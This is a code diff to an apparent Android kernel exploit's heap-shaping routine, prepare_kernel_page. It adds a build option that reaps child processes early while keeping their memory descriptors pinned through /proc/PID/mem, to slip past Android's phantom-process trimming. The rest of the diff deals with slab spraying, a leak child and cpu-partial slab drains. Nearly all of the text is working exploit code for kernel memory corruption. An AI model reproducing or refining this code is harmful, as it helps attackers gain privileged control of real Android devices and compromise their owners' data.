@@ -1027,6 +1027,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
 
+#if defined(APP_REAP_MM_CHILDREN_EARLY) && APP_REAP_MM_CHILDREN_EARLY
+  /*
+   * Android monitors native descendants of an app as phantom processes and
+   * may trim the whole group once enough children are live.  /proc/PID/mem
+   * keeps the child's mm_struct pinned after task exit, so reap each shaping
+   * child immediately and retain only that final mm reference.  Closing the
+   * descriptor later then performs the intended synchronous slab release.
+   */
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    prepare_ctx.memfds[i] = clone_memfd();
+    prepare_ctx.childs[i] = -1;
+  }
+  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+    spray_ctx.memfds[i] = clone_memfd();
+    spray_ctx.childs[i] = -1;
+  }
+#else
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
   }
@@ -1038,6 +1055,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.childs[i] = clone_child();
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
+#endif
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -1074,10 +1092,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 #endif
 
+#if defined(APP_REAP_MM_CHILDREN_EARLY) && APP_REAP_MM_CHILDREN_EARLY
+  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+    pre_ctx.memfds[i] = clone_memfd();
+    pre_ctx.childs[i] = -1;
+  }
+#else
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
   }
+#endif
   child_leak = clone_leak_child();
+#if defined(APP_REAP_MM_CHILDREN_EARLY) && APP_REAP_MM_CHILDREN_EARLY
+  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+    post_ctx.memfds[i] = clone_memfd();
+    post_ctx.childs[i] = -1;
+  }
+#else
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.childs[i] = clone_child();
   }
@@ -1085,7 +1116,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
+#endif
   memfd_leak = open_memfd(child_leak);
+#if !defined(APP_REAP_MM_CHILDREN_EARLY) || !APP_REAP_MM_CHILDREN_EARLY
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
@@ -1099,6 +1132,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     kill_child(spray_ctx.childs[i]);
   }
+#endif
   SYSCHK(waitpid(child_leak, NULL, 0));
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-child-exit");
@@ -1329,6 +1363,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     size_t index = i * mm_objs_per_slab;
     SYSCHK(close(prepare_ctx.memfds[index]));
     prepare_ctx.memfds[index] = -1;
+#if defined(APP_REAP_MM_CHILDREN_EARLY) && APP_REAP_MM_CHILDREN_EARLY
+    prepare_ctx.childs[index] = -1;
+#else
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #if (defined(APP_DEFER_ALL_DRAIN_REAPS) && \
      APP_DEFER_ALL_DRAIN_REAPS) || \
@@ -1365,6 +1402,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
     kill_child(prepare_ctx.childs[index]);
     prepare_ctx.childs[index] = -1;
+#endif
   }
 #if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
   pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
